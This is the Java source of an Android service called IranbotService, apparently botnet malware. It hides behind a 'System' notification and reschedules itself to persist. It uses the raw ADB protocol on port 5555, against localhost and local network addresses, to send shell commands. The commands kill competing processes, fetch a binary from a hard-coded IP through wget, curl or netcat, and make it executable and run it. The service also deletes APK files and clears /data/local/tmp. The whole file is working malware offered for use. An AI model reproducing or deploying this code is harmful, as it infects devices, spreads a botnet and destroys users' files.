package com.meow.laod;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.nio.*;

public class IranbotService extends Service {

    private static final String DOMAIN = "91.208.162.36";
    private static final int PORT = 80;
    private static final int NC_PAYLOAD_PORT = 4441;
    private static final String BINARY_NAME = "adbpersist.arm7"; //BIN NAME YOU SET, DEFAULT IS ADBPERSIST.ARM7
    private static final int TARGET_PORT = 5555;
    private static final int SLEEP_INTERVAL = 50000;
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 20000;

    private static final String[] TARGET_IPS = {
        "127.0.0.1",
        "192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4",
        "192.168.1.5", "192.168.1.6", "192.168.1.7", "192.168.1.8",
        "192.168.1.9", "192.168.1.10", "192.168.1.11",
        "0.0.0.0"
    };

    private static final int A_CNXN = 0x4e584e43;
    private static final int A_OPEN = 0x4e45504f;
    private static final int A_CLSE = 0x45534c43;
    private static final int ADB_VERSION = 0x01000000;
    private static final int MAX_DATA = 4096;

    private static final String TAG = "Iranbot";
    private static final String CHANNEL_ID = "iranbot_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final int ALARM_REQUEST = 1001;

    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Iranbot::WakeLock");
            wakeLock.acquire(60000);
        }
        Log.d(TAG, "Service onCreate");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try { doWork(); } catch (Exception e) { Log.e(TAG, "doWork error: " + e.getMessage()); }
                scheduleNextRun();
                stopSelf();
            }
        }).start();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        Log.w(TAG, "Service onDestroy");
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }

    private void scheduleNextRun() {
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        Intent i = new Intent(this, RestartReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, ALARM_REQUEST, i,
            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        if (am != null) {
            try { am.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + SLEEP_INTERVAL, pi); }
            catch (Exception e) { am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + SLEEP_INTERVAL, pi); }
            Log.d(TAG, "Next run in " + (SLEEP_INTERVAL/1000) + "s");
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_LOW);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System").setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details).setContentIntent(pi)
            .setOngoing(true).setPriority(Notification.PRIORITY_LOW).build();
    }

    private void sendShellCmd(String cmd) {
        for (String ip : TARGET_IPS) {
            try {
                Socket sock = new Socket();
                sock.connect(new InetSocketAddress(ip, TARGET_PORT), CONNECT_TIMEOUT);
                sock.setSoTimeout(READ_TIMEOUT);
                OutputStream out = sock.getOutputStream();
                InputStream in = sock.getInputStream();

                writeMsg(out, A_CNXN, ADB_VERSION, MAX_DATA, "host::\0".getBytes());
                Thread.sleep(600);

                writeMsg(out, A_OPEN, 1, 0, ("shell:" + cmd).getBytes());
                try {
                    int[] msg;
                    while ((msg = readMsg(in)) != null) {
                        if (msg[0] == A_CLSE) break;
                    }
                } catch (Exception e) {}
                sock.close();
                Log.d(TAG, "Shell OK on " + ip);
                return;
            } catch (Exception e) {
                Log.d(TAG, "No ADB on " + ip);
            }
        }
        Log.e(TAG, "No ADB on any IP");
    }

    private void doWork() {
        try {
            Log.d(TAG, "doWork start");
            cleanApksOnly("/sdcard");
            cleanDirectory("/data/local/tmp");

            String killCmd = "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; comm_name=\"$(cat \"$pid/comm\" 2>/dev/null)\"; [ -z \"$comm_name\" ] && continue; [ \"$comm_name\" = \"[net-worker]\" ] && continue; exe_path=\"$(readlink \"$pid/exe\" 2>/dev/null)\"; case \"$exe_path\" in /data/local/tmp/*) kill -9 \"$pid_num\" 2>/dev/null;; esac; done";
            Log.d(TAG, "Sending kill cmd...");
            sendShellCmd(killCmd);

            String wgetCmd = "(busybox wget http://" + DOMAIN + ":" + PORT + "/" + BINARY_NAME + " -O /data/local/tmp/x || toybox wget http://" + DOMAIN + ":" + PORT + "/" + BINARY_NAME + " -O /data/local/tmp/x || wget http://" + DOMAIN + ":" + PORT + "/" + BINARY_NAME + " -O /data/local/tmp/x || busybox curl http://" + DOMAIN + ":" + PORT + "/" + BINARY_NAME + " -o /data/local/tmp/x || toybox curl http://" + DOMAIN + ":" + PORT + "/" + BINARY_NAME + " -o /data/local/tmp/x || curl http://" + DOMAIN + ":" + PORT + "/" + BINARY_NAME + " -o /data/local/tmp/x)";
            Log.d(TAG, "Sending wget/curl cmd...");
            sendShellCmd(wgetCmd);

            String ncCmd = "(busybox nc " + DOMAIN + " " + NC_PAYLOAD_PORT + " > /data/local/tmp/x || toybox nc " + DOMAIN + " " + NC_PAYLOAD_PORT + " > /data/local/tmp/x || nc " + DOMAIN + " " + NC_PAYLOAD_PORT + " > /data/local/tmp/x)";
            Log.d(TAG, "Sending nc cmd...");
            sendShellCmd(ncCmd);

            String runCmd = "chmod 777 /data/local/tmp/x; (busybox /data/local/tmp/x apk || toybox /data/local/tmp/x apk || /data/local/tmp/x apk)";
            Log.d(TAG, "Sending chmod+run cmd...");
            sendShellCmd(runCmd);

            Log.d(TAG, "doWork done");
        } catch (Exception e) {
            Log.e(TAG, "doWork error: " + e.getMessage());
        }
    }

    private void writeMsg(OutputStream out, int cmd, int arg0, int arg1, byte[] payload) throws IOException {
        int magic = cmd ^ 0xFFFFFFFF, crc = 0;
        for (byte b : payload) crc += (b & 0xFF);
        ByteBuffer buf = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);
        buf.putInt(cmd); buf.putInt(arg0); buf.putInt(arg1); buf.putInt(payload.length); buf.putInt(crc); buf.putInt(magic);
        out.write(buf.array());
        if (payload.length > 0) out.write(payload);
        out.flush();
    }

    private int[] readMsg(InputStream in) throws IOException {
        byte[] header = new byte[24];
        int total = 0;
        while (total < 24) { int r = in.read(header, total, 24-total); if (r < 0) return null; total += r; }
        ByteBuffer buf = ByteBuffer.wrap(header).order(ByteOrder.LITTLE_ENDIAN);
        int cmd = buf.getInt(), arg0 = buf.getInt(), arg1 = buf.getInt(), len = buf.getInt();
        buf.getInt(); buf.getInt();
        if (len > 0 && len < MAX_DATA) { byte[] p = new byte[len]; total = 0; while (total < len) { int r = in.read(p, total, len-total); if (r < 0) break; total += r; } }
        return new int[]{cmd, arg0, arg1, len};
    }

    private void cleanApksOnly(String path) {
        File dir = new File(path); File[] files = dir.listFiles(); if (files == null) return;
        for (File f : files) { if (f.getName().endsWith(".apk")) f.delete(); }
    }

    private void cleanDirectory(String path) {
        File dir = new File(path); File[] files = dir.listFiles(); if (files == null) return;
        for (File f : files) f.delete();
    }
}